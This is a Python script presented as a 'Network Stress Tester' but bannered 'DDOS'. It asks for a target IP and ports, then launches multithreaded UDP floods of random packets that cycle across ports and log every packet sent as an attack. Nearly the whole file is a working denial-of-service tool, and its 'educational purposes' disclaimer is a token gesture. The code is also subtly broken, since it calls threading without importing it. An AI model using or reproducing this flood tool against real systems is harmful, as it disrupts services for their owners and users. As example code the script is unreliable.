#!/usr/bin/env python3

import os
import sys
import time
import socket
import random
from datetime import datetime
from django.core.validators import validate_ipv46_address
from django.core.exceptions import ValidationError

# Constants
BANNER = '''
************************************************
*        
    ____  ____  ____  _____    
   / __ \/ __ \/ __ \/ ___/    
  / / / / / / / / / /\__ \     
 / /_/ / /_/ / /_/ /___/ /     
/_____/_____/\____//____/      
                             *
*                               
*          Network Stress Tester             *
*          Author: Kndokar Ragib             *
************************************************
************************************************
*                                              *
*  [!] Disclaimer :                            *
*  1. Do Not Use For Personal Revenge          *
*  2. Author Is Not Responsible For Your Jobs  *
*  3. Use for learning and educational purposes *
************************************************
'''

LOG_FILE = "attack_log.txt"

# Logger
def log_message(message: str):
    with open(LOG_FILE, "a") as log_file:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_file.write(f"[{timestamp}] {message}\n")
    print(message)

# Validate target IP
def validate_ip(ip: str):
    try:
        validate_ipv46_address(ip)
        return True
    except ValidationError:
        return False

# Attack function
def attack(ip: str, port: int, packet_size: int, rate_limit: float):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(packet_size)
    sent = 0
    try:
        while True:
            sock.sendto(data, (ip, port))
            sent += 1
            log_message(f"Thread-{threading.get_ident()}: Sent packet #{sent} to {ip}:{port}")
            port = port + 1 if port < 65534 else 1
            time.sleep(rate_limit)
    except KeyboardInterrupt:
        log_message("Attack interrupted by user.")
    except Exception as e:
        log_message(f"Error in thread {threading.get_ident()}: {e}")
    finally:
        sock.close()

# Main script execution
def main():
    os.system("clear")
    print(BANNER)
    ip = input(" [+] Enter Target IP: ").strip()
    if not validate_ip(ip):
        log_message("Invalid IP address provided. Exiting...")
        sys.exit(1)

    try:
        port = int(input(" [+] Enter Starting Port Number (default 80): ").strip() or 80)
        packet_size = int(input(" [+] Enter Packet Size (default 1490 bytes): ").strip() or 1490)
        threads = int(input(" [+] Enter Number of Threads (default 4): ").strip() or 4)
        rate_limit = float(input(" [+] Enter Rate Limit (seconds, default 0.01): ").strip() or 0.01)
    except ValueError:
        log_message("Invalid input provided. Exiting...")
        sys.exit(1)

    os.system("clear")
    print(BANNER)
    log_message(f"Starting attack on {ip}:{port} with {threads} threads.")
    print(" [+] Press Ctrl+C to stop the attack.")

    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(ip, port, packet_size, rate_limit))
        thread.daemon = True
        thread.start()
        thread_list.append(thread)

    try:
        for thread in thread_list:
            thread.join()
    except KeyboardInterrupt:
        log_message("Attack stopped by user.")

if __name__ == "__main__":
    main()
